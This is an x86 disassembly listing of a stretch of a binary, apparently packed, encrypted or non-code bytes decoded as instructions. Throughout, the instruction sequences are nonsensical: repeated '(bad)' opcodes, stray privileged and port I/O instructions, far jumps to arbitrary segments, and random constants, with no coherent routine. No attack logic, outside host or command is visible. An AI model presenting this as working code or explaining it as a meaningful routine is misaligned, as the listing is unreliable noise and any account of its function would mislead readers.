  42cac2:	lods   al,BYTE PTR ds:[esi]
  42cac3:	js     0x42cac7
  42cac5:	adc    eax,ebp
  42cac7:	fs push ebx
  42cac9:	inc    ebx
  42caca:	(bad)  
  42cacb:	mov    eax,0xe41f45db
  42cad0:	mov    ds:0x1ad99e34,eax
  42cad5:	std    
  42cad6:	dec    esi
  42cad7:	sbb    dl,BYTE PTR [eax+ebp*8+0x43]
  42cadb:	mov    bl,0x42
  42cadd:	ss cs add eax,0x6f880e3a
  42cae4:	sub    al,0x96
  42cae6:	xor    eax,DWORD PTR [ebx]
  42cae8:	and    edx,DWORD PTR [esi-0x7fd966ea]
  42caee:	scas   al,BYTE PTR es:[edi]
  42caef:	loopne 0x42ca93
  42caf1:	ss cmp eax,0xb441c564
  42caf7:	xlat   BYTE PTR ds:[ebx]
  42caf9:	call   0x9772ebce
  42cafe:	xor    al,0x51
  42cb00:	ret    
  42cb01:	lds    edx,FWORD PTR [edx+0x19]
  42cb04:	xchg   esi,eax
  42cb05:	vpsubusb ymm2,ymm2,YMMWORD PTR [ebx+ebx*1+0x12]
  42cb0b:	pushf  
  42cb0c:	ds cmp al,0x93
  42cb0f:	ret    
  42cb10:	push   ebp
  42cb11:	jge    0x42cb0a
  42cb13:	adc    cl,BYTE PTR [edi-0x2d]
  42cb16:	arpl   WORD PTR [edx+0x5e0fc23c],sp
  42cb1c:	(bad)  
  42cb1d:	xchg   esp,eax
  42cb1e:	(bad)  
  42cb1f:	jmp    0x15f1c467
  42cb24:	pop    es
  42cb25:	test   BYTE PTR [edx],dh
  42cb27:	test   BYTE PTR [ebx+edi*4+0x28],al
  42cb2b:	push   ds
  42cb2c:	xchg   BYTE PTR [esi+edi*1],bh
  42cb2f:	sub    al,0xcf
  42cb31:	and    ebx,DWORD PTR [ebx]
  42cb33:	inc    esp
  42cb34:	pop    ebp
  42cb35:	or     eax,0xa2998785
  42cb3a:	inc    esp
  42cb3b:	jbe    0x42cb4d
  42cb3d:	mov    ch,0x31
  42cb3f:	ins    BYTE PTR es:[edi],dx
  42cb40:	scas   eax,DWORD PTR es:[edi]
  42cb41:	or     dl,BYTE PTR [edi]
  42cb43:	int3   
  42cb44:	adc    bh,ah
  42cb46:	retf   
  42cb47:	stc    
  42cb48:	pop    esp
  42cb49:	shr    DWORD PTR [esi+0x4e9bc13e],cl
  42cb4f:	arpl   WORD PTR [edx+0x16],bx
  42cb52:	ror    BYTE PTR [ebx-0x73],cl
  42cb55:	or     BYTE PTR [ebx-0x66d2de1b],dl
  42cb5b:	test   al,0xa7
  42cb5d:	xchg   esi,eax
  42cb5e:	loopne 0x42cb31
  42cb60:	xchg   ecx,eax
  42cb61:	dec    edx
  42cb62:	rol    ebx,cl
  42cb64:	aaa    
  42cb65:	add    DWORD PTR [edx-0x6df3719e],0x2e
  42cb6c:	adc    eax,0xfef1a8f1
  42cb71:	retf   
  42cb72:	dec    ebp
  42cb73:	jo     0x42cb2b
  42cb75:	test   ebx,0xf7c990b6
  42cb7b:	add    ebp,DWORD PTR [eax+0x454e6cf2]
  42cb81:	lds    ecx,FWORD PTR [esp+eiz*8]
  42cb84:	js     0x42cb29
  42cb86:	ror    BYTE PTR [edx-0x584bee6f],cl
  42cb8c:	cmp    ecx,DWORD PTR [ebp-0x7ae5aa97]
  42cb92:	in     al,0xf
  42cb94:	ret    0xc71b
  42cb97:	inc    esi
  42cb98:	sar    BYTE PTR [edx+0x2b2ca8a4],0xfa
  42cb9f:	push   es
  42cba0:	cdq    
  42cba1:	ins    BYTE PTR es:[edi],dx
  42cba2:	shl    BYTE PTR [esi-0x77],cl
  42cba5:	add    BYTE PTR [ebx+0x67],dh
  42cba8:	pusha  
  42cba9:	ficomp WORD PTR [eax+0x1e]
  42cbac:	jns    0x42cc13
  42cbae:	loopne 0x42cbad
  42cbb0:	div    ecx
  42cbb2:	or     BYTE PTR [esi-0x10],0x0
	...
  42cc16:	jg     0x42cc1a
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	jmp    0x42cbeb
  42cc24:	call   0x700:0x1df2c4f
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    BYTE PTR [esi-0x740ffd60],ch
  42cc33:	and    al,0xf5
  42cc35:	mov    ch,BYTE PTR [edi-0x72]
  42cc38:	sbb    BYTE PTR [esi],al
  42cc3a:	psubb  mm1,QWORD PTR [eax-0x3cc4011d]
  42cc41:	stos   DWORD PTR es:[edi],eax
  42cc42:	mov    ecx,0xd2aa98be
  42cc47:	fwait
  42cc48:	jg     0x42cc8d
  42cc4a:	sbb    eax,0xb7f75ee9
  42cc4f:	test   al,0x14
  42cc51:	pop    es
  42cc52:	push   cs
  42cc53:	fsub   DWORD PTR [ecx+0x6c]
  42cc56:	mov    al,0x73
  42cc58:	jae    0x42cc19
  42cc5a:	loope  0x42cca7
  42cc5c:	aad    0xc7
  42cc5e:	stc    
  42cc5f:	das    
  42cc60:	push   0x58
  42cc62:	pop    ebp
  42cc63:	xchg   esp,eax
  42cc64:	lods   eax,DWORD PTR ds:[esi]
  42cc65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc66:	xchg   esp,eax
  42cc67:	jmp    0xab6:0x92f7381a
  42cc6e:	popa   
  42cc6f:	cmp    DWORD PTR [edx-0x39319ea1],0x5cd514d8
  42cc79:	sbb    al,0x29
  42cc7b:	jb     0x42cc0f
  42cc7d:	jnp    0x42cc47
  42cc7f:	aad    0xb
  42cc81:	popf   
  42cc82:	jo     0x42cc2b
  42cc84:	in     eax,dx
  42cc85:	arpl   WORD PTR [ecx+0x49],si
  42cc88:	neg    DWORD PTR [edi-0x324d47ee]
  42cc8e:	xchg   esi,esp
  42cc90:	cmc    
  42cc91:	mov    eax,0x7a5f1632
  42cc96:	xor    al,0x1d
  42cc98:	pop    es
  42cc99:	pop    ebx
  42cc9a:	not    ch
  42cc9c:	ins    BYTE PTR es:[edi],dx
  42cc9d:	inc    ebx
  42cc9e:	jl     0x42cceb
  42cca0:	in     eax,0xea
  42cca2:	add    DWORD PTR [ebp+0x1f],ebx
  42cca5:	fld    DWORD PTR [edx-0x2974e3b]
  42ccab:	sbb    eax,0x6a
  42ccae:	adc    al,al
  42ccb0:	xchg   ecx,eax
  42ccb1:	adc    ebp,DWORD PTR [ebx+0x0]
  42ccb4:	fstp   TBYTE PTR [ecx-0x5bffd651]
  42ccba:	sbb    al,0xe8
  42ccbc:	repz pushf 
  42ccbe:	push   ds
  42ccbf:	or     eax,0xd2e522c5
  42ccc4:	hlt    
  42ccc5:	jo     0x42cd08
  42ccc7:	sub    eax,0xe50c1f76
  42cccc:	ror    ebp,1
  42ccce:	pop    ebx
  42cccf:	xor    BYTE PTR [edx],bl
  42ccd1:	sbb    ecx,esp
  42ccd3:	mov    dh,0xce
  42ccd5:	xor    ebp,DWORD PTR [esi+0x4]
  42ccd8:	ffreep st(5)
  42ccda:	in     al,0x3d
  42ccdc:	and    al,0xbd
  42ccde:	add    esi,DWORD PTR [edx-0x17654f3e]
  42cce4:	sub    DWORD PTR [ebx],ebx
  42cce6:	les    ebx,FWORD PTR [edi-0x7]
  42cce9:	aam    0x7b
  42cceb:	icebp  
  42ccec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cced:	xor    al,0x62
  42ccef:	and    edx,DWORD PTR [eax-0x2f]
  42ccf2:	mov    esp,0xfa4b1a67
  42ccf7:	ds mov ebp,0xa5a7cfc9
  42ccfd:	mov    ebp,es
  42ccff:	das    
  42cd00:	mov    BYTE PTR [edx],bh
  42cd02:	inc    edx
  42cd03:	pop    eax
  42cd04:	(bad)  
  42cd05:	imul   edi,DWORD PTR [edx+esi*2+0x323122de],0x999201ff
  42cd10:	test   ah,dh
  42cd12:	xor    al,0xa0
  42cd14:	mov    edx,0x46fe4e7c
  42cd19:	hlt    
  42cd1a:	jl     0x42cd84
  42cd1c:	stc    
  42cd1d:	clc    
  42cd1e:	sub    BYTE PTR [eax+0x76],bl
  42cd21:	cs pop edx
  42cd23:	adc    eax,0xafa58348
  42cd28:	shl    DWORD PTR [esi],0x86
  42cd2b:	fcom   QWORD PTR [eax+0x186a169b]
  42cd31:	add    eax,0x1361b1
	...
  42cd96:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	out    dx,al
  42cda3:	inc    ecx
  42cda4:	mov    WORD PTR [ecx+0x1e033],?
  42cdaa:	pop    es
  42cdab:	add    DWORD PTR [eax],eax
  42cdad:	add    BYTE PTR [esi-0x61],dl
  42cdb0:	pop    edx
  42cdb1:	jnp    0x42cd5b
  42cdb3:	jmp    0x79a3:0xb7738ef3
  42cdba:	fistp  WORD PTR [eax-0x12]
  42cdbd:	div    eax
  42cdbf:	adc    eax,0xba7fcb31
  42cdc4:	dec    esp
  42cdc5:	ins    DWORD PTR es:[edi],dx
  42cdc6:	(bad)  
  42cdc7:	stc    
  42cdc8:	sub    eax,0x1d104ff9
  42cdcd:	fsub   QWORD PTR [ebx]
  42cdcf:	std    
  42cdd0:	jne    0x42ce15
  42cdd2:	jno    0x42ce31
  42cdd4:	mov    cs,ecx
  42cdd6:	ins    DWORD PTR es:[edi],dx
  42cdd7:	xor    eax,0x2e81121e
  42cddc:	jo     0x42ce23
  42cdde:	sbb    BYTE PTR es:[ebp+eax*4-0x3a],bl
  42cde3:	jp     0x42ce4c
  42cde5:	or     al,BYTE PTR [esi+esi*8-0x187b065e]
  42cdec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cded:	(bad)  
  42cdee:	shl    BYTE PTR [edx-0x67],0x2b
  42cdf2:	cmp    bh,BYTE PTR ds:[eax]
  42cdf5:	out    dx,al
  42cdf6:	jle    0x42ce60
  42cdf8:	sahf   
  42cdf9:	(bad)  
  42cdfa:	pop    ebp
  42cdfb:	jnp    0x42cdd8
  42cdfd:	sub    dl,0x5b
  42ce00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce01:	inc    edi
  42ce02:	mov    edi,0x85b46f17
  42ce07:	jnp    0x42cdcc
  42ce09:	test   al,0x4
  42ce0b:	mov    ch,0x8a
  42ce0d:	or     DWORD PTR [eax-0x1b438158],eax
  42ce13:	push   0xffffffe9
  42ce15:	cmp    BYTE PTR [ecx-0x3c0760ae],ch
  42ce1b:	add    BYTE PTR [edi],bh
  42ce1d:	push   ebx
  42ce1e:	or     DWORD PTR [edx-0x10da309b],esi
  42ce24:	popf   
  42ce25:	jecxz  0x42ce50
  42ce27:	es xchg esp,eax
  42ce29:	js     0x42ce11
  42ce2b:	and    ecx,DWORD PTR ds:0xa952a109
  42ce31:	mov    BYTE PTR [ecx],al
  42ce33:	(bad)  
  42ce34:	jns    0x42ce57
  42ce36:	inc    eax
  42ce37:	add    BYTE PTR [edx],dh
  42ce39:	popf   
  42ce3a:	add    BYTE PTR [eax+0x42],bl
  42ce3d:	cmc    
  42ce3e:	scas   eax,DWORD PTR es:[edi]
  42ce3f:	into   
  42ce40:	mov    bh,ch
  42ce42:	mov    ecx,0xcf7fe079
  42ce47:	mov    ds:0x22c47e8e,eax
  42ce4c:	inc    ebp
  42ce4d:	pop    ebp
  42ce4e:	enter  0x6c82,0xfb
  42ce52:	inc    ebx
  42ce53:	mov    ebx,0xa6085b75
  42ce58:	pop    es
  42ce59:	jle    0x42ce1f
  42ce5b:	mov    edx,0x4397b5e2
  42ce60:	sub    ch,BYTE PTR [edx+0x47b2fa7d]
  42ce66:	jnp    0x42ce3a
  42ce68:	push   ds
  42ce69:	test   BYTE PTR [ecx+edx*2],dl
  42ce6c:	sub    al,BYTE PTR [ecx]
  42ce6e:	enter  0x96e7,0xda
  42ce72:	and    DWORD PTR ds:0xfbd10ad1,edx
  42ce78:	mov    edx,0x6dca4bcc
  42ce7d:	out    0x88,al
  42ce7f:	imul   ebx,DWORD PTR [edx-0x51a3cd52],0x69ecca38
  42ce89:	(bad)  
  42ce8a:	out    dx,eax
  42ce8b:	sub    ch,BYTE PTR [ebx-0x9]
  42ce8e:	or     ebp,DWORD PTR [ecx]
  42ce90:	pop    esi
  42ce91:	ja     0x42ce63
  42ce93:	or     ch,al
  42ce95:	xchg   DWORD PTR [ebx+0x5c],edx
  42ce98:	cs cwde 
  42ce9a:	jo     0x42ce51
  42ce9c:	nop
  42ce9d:	(bad)  
  42ce9e:	cmp    cl,BYTE PTR [esi]
  42cea0:	daa    
  42cea1:	mov    bh,0x3b
  42cea3:	or     eax,0x111b6f45
  42cea8:	sub    DWORD PTR [ebp-0x4f2e0c12],esp
  42ceae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ceaf:	data16 mov cl,0xe4
  42ceb2:	shl    DWORD PTR [eax],0x6
	...
  42cf15:	add    BYTE PTR [ebx+0x3d],dh
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx+0x22562d11]
  42cf24:	push   edx
  42cf25:	and    al,0x3a
  42cf27:	loope  0x42cf2a
  42cf29:	add    BYTE PTR [edi],al
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    BYTE PTR [ecx-0x6ccebf14],bl
  42cf33:	mov    al,0x92
  42cf35:	and    al,0x2e
  42cf37:	ds icebp 
  42cf39:	(bad)  [eax+esi*8]
  42cf3c:	jno    0x42cf70
  42cf3e:	cmc    
  42cf3f:	cwde   
  42cf40:	leave  
  42cf41:	or     DWORD PTR [ecx],ebx
  42cf43:	test   DWORD PTR [eax-0x6fca33a5],ebx
  42cf49:	mov    dl,0x3f
  42cf4b:	sbb    bl,al
  42cf4d:	ds push ecx
  42cf4f:	mov    ebx,DWORD PTR [ebp+edi*8+0x7116ac5b]
  42cf56:	out    0x24,al
  42cf58:	test   eax,0xd4ed8acf
  42cf5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf5e:	jb     0x42cf21
  42cf60:	out    dx,al
  42cf61:	lods   eax,DWORD PTR ds:[esi]
  42cf62:	mov    ah,0xee
  42cf64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf65:	orps   xmm6,XMMWORD PTR [edx+ecx*8+0x2b]
  42cf6a:	lods   al,BYTE PTR ds:[esi]
  42cf6b:	ffreep st(2)
  42cf6d:	call   0x5624:0x5827510
  42cf74:	ret    
  42cf75:	jno    0x27e06e66
  42cf7b:	pop    ebp
  42cf7c:	enter  0x2e70,0x25
  42cf80:	jecxz  0x42cf62
  42cf82:	adc    ebp,0xd6baa3e3
  42cf88:	mov    eax,0x27a48eaa
  42cf8d:	push   ss
  42cf8e:	mov    bl,0xc5
  42cf90:	aas    
  42cf91:	sub    cl,BYTE PTR [ebx+0x1e207711]
  42cf97:	enter  0x95ef,0xf8
  42cf9b:	out    0x94,al
  42cf9d:	in     eax,dx
  42cf9e:	push   ebp
  42cf9f:	mov    al,0x3
  42cfa1:	js     0x42d014
  42cfa3:	outs   dx,BYTE PTR ds:[esi]
  42cfa4:	daa    
  42cfa5:	push   edx
  42cfa6:	xchg   ebp,eax
  42cfa7:	pop    eax
  42cfa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cfa9:	repnz nop
  42cfab:	inc    eax
  42cfac:	adc    edx,esi
  42cfae:	sar    dh,1
  42cfb0:	ret    
  42cfb1:	and    al,0xf1
  42cfb3:	xchg   esi,eax
  42cfb4:	pop    eax
  42cfb5:	mov    ebp,0xf71e6ab1
  42cfba:	push   ebx
  42cfbb:	xor    al,0xa9
  42cfbe:	sbb    eax,0x41c6722f
  42cfc3:	stc    
  42cfc4:	sub    bl,0x77
  42cfc7:	sbb    bl,BYTE PTR [ebx]
  42cfc9:	lea    edi,[ebx+0xa]
  42cfcc:	xor    bl,0x79
  42cfcf:	adc    eax,0x451368a8
  42cfd4:	push   0xacff8148
  42cfd9:	cmp    eax,0xa32672e1
  42cfde:	repz fwait
  42cfe0:	imul   edi,DWORD PTR [edx+0x75b1a68d],0xffffffd5
  42cfe7:	fist   DWORD PTR [edx+0x1d]
  42cfea:	xchg   esi,eax
  42cfeb:	add    DWORD PTR [edx],ebx
  42cfed:	cmp    DWORD PTR [esi+0x5a],ebx
  42cff0:	in     al,dx
  42cff1:	imul   edx,DWORD PTR [bx+si-0x45dc],0x8e1c86c2
  42cffa:	mov    bh,0x44
  42cffc:	jge    0x42d036
  42cffe:	lock jo 0x42d039
  42d001:	cli    
  42d002:	adc    DWORD PTR ds:0x14d96b1c,0xba95f95f
  42d00c:	pop    ds
  42d00d:	daa    
  42d00e:	cmp    ah,dl
  42d010:	adc    ch,BYTE PTR [esi+0x3a]
  42d013:	push   0xffffff95
  42d015:	std    
  42d016:	fstp   DWORD PTR [esi-0xfb3015d]
  42d01c:	call   0xbe072e64
  42d021:	sbb    al,0x3f
  42d023:	inc    eax
  42d024:	inc    ebp
  42d025:	lock adc al,0xc4
  42d028:	push   ebp
  42d029:	mov    ds:0x42b143d6,al
  42d02e:	iret   
  42d02f:	and    BYTE PTR [eax],dh
  42d031:	dec    esi
  42d032:	ret    
  42d033:	lock mov eax,DWORD PTR [eax]
	...
  42d096:	push   eax
  42d097:	cmp    al,dh
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	dec    edx
  42d0a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0a4:	add    dh,dl
  42d0a6:	inc    ecx
  42d0a7:	loop   0x42d0aa
  42d0a9:	add    BYTE PTR [edi],al
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    BYTE PTR [edx+0x12c0aae0],dh
  42d0b3:	push   cs
  42d0b4:	mov    esp,ebx
  42d0b6:	ret    0x53bd
  42d0b9:	push   edx
  42d0ba:	inc    eax
  42d0bb:	dec    esi
  42d0bc:	xchg   ecx,eax
  42d0bd:	xor    ah,bh
  42d0bf:	pop    esp
  42d0c0:	pop    ecx
  42d0c1:	xchg   esp,eax
  42d0c2:	sbb    bl,0xc0
  42d0c5:	jno    0x42d077
  42d0c7:	and    al,bl
  42d0c9:	mov    al,0x5b
  42d0cb:	adc    eax,0x9669c39e
  42d0d0:	test   eax,0x212677ba
  42d0d5:	pop    ebp
  42d0d6:	and    BYTE PTR [ecx],0x34
  42d0d9:	and    eax,0x9bb36e37
  42d0de:	jnp    0x42d135
  42d0e0:	out    0x2a,al
  42d0e2:	xor    dh,BYTE PTR [edi]
  42d0e4:	mov    dh,0x2a
  42d0e6:	in     al,dx
  42d0e7:	lods   al,BYTE PTR ds:[esi]
  42d0e8:	retf   
  42d0e9:	sub    esi,DWORD PTR [ebp+0x63]
  42d0ec:	arpl   WORD PTR [edi],dx
  42d0ee:	push   ecx
  42d0ef:	int    0x94
  42d0f1:	leave  
  42d0f2:	dec    edx
  42d0f3:	or     al,0x38
  42d0f5:	lods   eax,DWORD PTR ds:[esi]
  42d0f6:	(bad)  
  42d0f7:	addr16 ret 0x7054
  42d0fb:	mov    ds:0x16a25534,al
  42d100:	push   0xffffffcc
  42d102:	aad    0x27
  42d104:	sahf   
  42d105:	test   eax,0xef95d20f
  42d10a:	jecxz  0x42d11a
  42d10c:	test   DWORD PTR [edi+0xf],esi
  42d10f:	mov    ecx,0xc9fc0253
  42d114:	ds loopne 0x42d10c
  42d117:	icebp  
  42d118:	cmp    eax,0x2130a574
  42d11d:	clc    
  42d11e:	jno    0x42d161
  42d120:	cmp    ecx,DWORD PTR [ebp+0x7a2e50a5]
  42d126:	mov    al,0xa8
  42d128:	icebp  
  42d129:	jg     0x42d14e
  42d12b:	or     BYTE PTR [edi+0x35f506b4],ch
  42d131:	pop    ecx
  42d132:	jecxz  0x42d0ba
  42d134:	div    BYTE PTR [eax]
  42d136:	or     edx,DWORD PTR [ebp+edi*8+0x68edd42c]
  42d13d:	popf   
  42d13e:	fadd   DWORD PTR [ecx-0x4f92b9f9]
  42d144:	shr    cl,1
  42d146:	in     al,0xa0
  42d148:	(bad)  
  42d149:	cmp    BYTE PTR [esi-0x3e],dl
  42d14c:	jns    0x42d16f
  42d14e:	cmp    dh,dl
  42d150:	cli    
  42d151:	lds    esp,FWORD PTR [edi+ebp*4]
  42d154:	inc    ecx
  42d155:	fld    QWORD PTR [esi-0x41]
  42d158:	sbb    ch,BYTE PTR [edi-0x1d]
  42d15b:	sbb    eax,0xc553d9
  42d160:	inc    esp
  42d161:	or     ah,BYTE PTR ds:0xc5b84f14
  42d167:	stos   BYTE PTR es:[edi],al
  42d168:	dec    ebp
  42d169:	and    al,0x32
  42d16b:	into   
  42d16c:	icebp  
  42d16d:	ins    DWORD PTR es:[edi],dx
  42d16e:	push   ecx
  42d16f:	sbb    DWORD PTR [eax+ebx*4+0x23],0x41
  42d174:	fwait
  42d175:	add    eax,0x996d4eab
  42d17a:	gs xchg edi,eax
  42d17c:	dec    esi
  42d17d:	inc    eax
  42d17e:	push   edi
  42d17f:	int    0x43
  42d181:	arpl   WORD PTR [edi],cx
  42d183:	mov    BYTE PTR [ebx],dh
  42d185:	add    edx,ecx
  42d187:	dec    esp
  42d188:	popf   
  42d189:	(bad)  
  42d18a:	push   ebx
  42d18b:	adc    ebp,DWORD PTR [edx+ebp*4+0x21ed03b1]
  42d192:	pop    es
  42d193:	or     al,0xb0
  42d195:	jge    0x42d128
  42d197:	lds    ebp,FWORD PTR [ebx+0x7925f67a]
  42d19d:	dec    eax
  42d19e:	ret    0x7336
  42d1a1:	lods   al,BYTE PTR ds:[esi]
  42d1a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1a3:	jns    0x42d1fa
  42d1a5:	sub    cl,BYTE PTR [ebx+0x27964b49]
  42d1ab:	xchg   esp,ebx
  42d1ad:	xchg   esi,eax
  42d1ae:	xchg   ecx,eax
  42d1af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d1b0:	pcmpgtb mm6,QWORD PTR [esi+0xb689]
	...
  42d213:	add    BYTE PTR [eax],al
  42d215:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	and    BYTE PTR [ecx-0x2c],dl
  42d225:	inc    edi
  42d226:	dec    eax
  42d227:	jecxz  0x42d22a
  42d229:	add    BYTE PTR [edi],al
  42d22b:	add    DWORD PTR [eax],eax
  42d22d:	add    BYTE PTR [esi-0x4940da],ah
  42d233:	xchg   esi,eax
  42d234:	adc    ecx,0xdaf4dc9d
  42d23a:	mov    ch,0x57
  42d23c:	xor    esi,DWORD PTR [ecx-0x50]
  42d23f:	retf   
  42d240:	mov    gs,WORD PTR [esi-0x8]
  42d243:	outs   dx,DWORD PTR ss:[esi]
  42d245:	fdiv   DWORD PTR [ecx-0x9]
  42d248:	out    dx,eax
  42d249:	jns    0x42d2a3
  42d24b:	xchg   ebp,eax
  42d24c:	sub    edx,esi
  42d24e:	dec    edx
  42d24f:	(bad)  
  42d250:	jbe    0x42d26f
  42d252:	scas   al,BYTE PTR es:[edi]
  42d253:	call   FWORD PTR [esi+0x70]
  42d256:	mov    edi,0xb05ab226
  42d25b:	cmp    BYTE PTR [ecx-0x20],cl
  42d25e:	out    0x8e,al
  42d260:	pushf  
  42d261:	imul   esp,edi,0x5e
  42d264:	sub    BYTE PTR [esi],ah
  42d266:	cmp    BYTE PTR [eax],0xe
  42d269:	cmp    eax,0x7fdb94d7
  42d26e:	aam    0x25
  42d270:	add    al,0x4d
  42d272:	clc    
  42d273:	scas   eax,DWORD PTR es:[edi]
  42d274:	pop    edi
  42d275:	jne    0x42d229
  42d277:	bswap  ebp
  42d279:	repz jbe 0x42d2cd
  42d27c:	add    DWORD PTR [ecx+0x4d],edi
  42d27f:	imul   DWORD PTR ds:0xac94fcf8
  42d285:	jp     0x42d2b1
  42d287:	mov    dl,BYTE PTR [edx+0x23]
  42d28a:	ret    
  42d28b:	(bad)  
  42d28c:	jae    0x42d22b
  42d28e:	xor    eax,0x11fa56d
  42d293:	popf   
  42d294:	les    eax,FWORD PTR [edi+ecx*4+0x6c8b05c1]
  42d29b:	arpl   WORD PTR [edi],sp
  42d29d:	bound  ebx,QWORD PTR [ebx+esi*1]
  42d2a0:	ins    BYTE PTR es:[edi],dx
  42d2a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2a2:	push   es
  42d2a3:	or     DWORD PTR [edi-0x2d],esi
  42d2a6:	sti    
  42d2a7:	out    dx,eax
  42d2a8:	sbb    al,0x75
  42d2aa:	lahf   
  42d2ab:	(bad)  
  42d2ac:	mov    ch,BYTE PTR [esi]
  42d2ae:	es loop 0x42d2a7
  42d2b1:	pop    esp
  42d2b2:	sub    eax,0x75d97e28
  42d2b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2b8:	xor    eax,esp
  42d2ba:	inc    ebx
  42d2bb:	out    dx,al
  42d2bc:	aad    0xf3
  42d2be:	out    dx,eax
  42d2bf:	std    
  42d2c0:	push   esi
  42d2c1:	jmp    0xe2eda38a
  42d2c6:	fild   DWORD PTR [edx-0x767a9bbc]
  42d2cc:	xchg   ebp,eax
  42d2cd:	adc    eax,0xc1cca717
  42d2d2:	scas   al,BYTE PTR es:[edi]
  42d2d3:	xchg   ebp,eax
  42d2d4:	repnz cmp dl,0x7f
  42d2d8:	cmp    eax,0x14df4fe0
  42d2dd:	sti    
  42d2de:	popf   
  42d2df:	int    0x5a
  42d2e1:	popa   
  42d2e2:	daa    
  42d2e3:	xor    cl,BYTE PTR [edi+0x72]
  42d2e6:	imul   edi,DWORD PTR [eax+0x25],0xba6bf775
  42d2ed:	push   edi
  42d2ee:	lods   al,BYTE PTR ds:[esi]
  42d2ef:	jp     0x42d328
  42d2f1:	cli    
  42d2f2:	ins    DWORD PTR es:[edi],dx
  42d2f3:	or     ecx,DWORD PTR [edx]
  42d2f5:	int    0x45
  42d2f7:	aam    0xf1
  42d2f9:	xor    BYTE PTR [esi],0x9d
  42d2fc:	and    BYTE PTR [edi],0xd6
  42d2ff:	call   0x79ffbb87
  42d304:	push   ecx
  42d305:	mov    dl,0x85
  42d307:	shr    ecx,1
  42d309:	cmp    DWORD PTR [edi-0x46],edx
  42d30c:	and    edx,DWORD PTR [eax+0x59]
  42d30f:	push   ss
  42d310:	add    edx,DWORD PTR [edi+0x69]
  42d313:	pop    ds
  42d314:	xchg   edx,eax
  42d315:	jp     0x42d316
  42d317:	clc    
  42d318:	fisttp DWORD PTR [eax]
  42d31a:	xchg   ecx,eax
  42d31b:	push   0x4930cd84
  42d320:	loop   0x42d2bf
  42d322:	cld    
  42d323:	cld    
  42d324:	scas   al,BYTE PTR es:[edi]
  42d325:	jmp    0xbe112c18
  42d32a:	cmp    al,0xbb
  42d32c:	mov    dh,0xc0
  42d32e:	add    ah,dh
  42d330:	cmp    eax,0x1282ab02
	...
  42d395:	add    cl,al
  42d397:	into   
  42d398:	arpl   WORD PTR [ecx-0x21044291],bx
  42d39e:	cmp    BYTE PTR [esp+ecx*8-0x642e86a8],bl
  42d3a5:	and    eax,0x1e44f
  42d3aa:	pop    es
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    cl,cl
  42d3af:	(bad)  
  42d3b0:	sub    al,0x2b
  42d3b2:	daa    
  42d3b3:	popa   
  42d3b4:	mov    gs,WORD PTR [esi+0xe5bd384]
  42d3ba:	inc    edi
  42d3bb:	shl    BYTE PTR [esi-0x52],1
  42d3be:	fistp  WORD PTR ds:0xb295799c
  42d3c4:	mov    DWORD PTR [edi+0x7dc0cf0b],edx
  42d3ca:	loope  0x42d41b
  42d3cc:	fwait
  42d3cd:	lea    esi,[ebx]
  42d3cf:	inc    edi
  42d3d0:	jmp    0x99ea:0x18204a29
  42d3d7:	add    BYTE PTR [eax+0x163bbe09],0x24
  42d3de:	cli    
  42d3df:	inc    edx
  42d3e0:	xchg   DWORD PTR [esi],esp
  42d3e2:	push   edi
  42d3e3:	jg     0x42d38d
  42d3e5:	sub    ebx,DWORD PTR ds:0xe505d44e
  42d3eb:	out    dx,eax
  42d3ec:	cmp    eax,0x9717e54f
  42d3f1:	push   ds
  42d3f2:	inc    eax
  42d3f3:	in     al,0x1a
  42d3f5:	add    BYTE PTR [eax+edi*4],cl
  42d3f8:	idiv   bh
  42d3fa:	scas   al,BYTE PTR es:[edi]
  42d3fb:	imul   ebx,DWORD PTR [ebx-0x850f739],0x52a1a60c
  42d405:	stc    
  42d406:	sbb    DWORD PTR [esi],0x881ecad8
  42d40c:	mov    esp,0x2bfcd474
  42d411:	cs jg  0x42d3ec
  42d414:	outs   dx,BYTE PTR ds:[esi]
  42d415:	pop    ebp
  42d416:	sbb    DWORD PTR [ecx+0x1e],edi
  42d419:	sbb    eax,0x1a6fda8f
  42d41e:	fcmovne st,st(3)
  42d420:	sti    
  42d421:	jb     0x42d494
  42d423:	mov    eax,ds:0x49b44599
  42d428:	out    dx,eax
  42d429:	mov    dh,0x13
  42d42b:	lock in eax,dx
  42d42d:	retf   0x40a8
  42d430:	ficom  WORD PTR [ebx-0x2]
  42d433:	add    ch,BYTE PTR [ebx-0x57981527]
  42d439:	outs   dx,DWORD PTR ds:[esi]
  42d43a:	cld    
  42d43b:	es dec esi
  42d43d:	sub    BYTE PTR [edx+0xc],0x9b
  42d441:	out    dx,eax
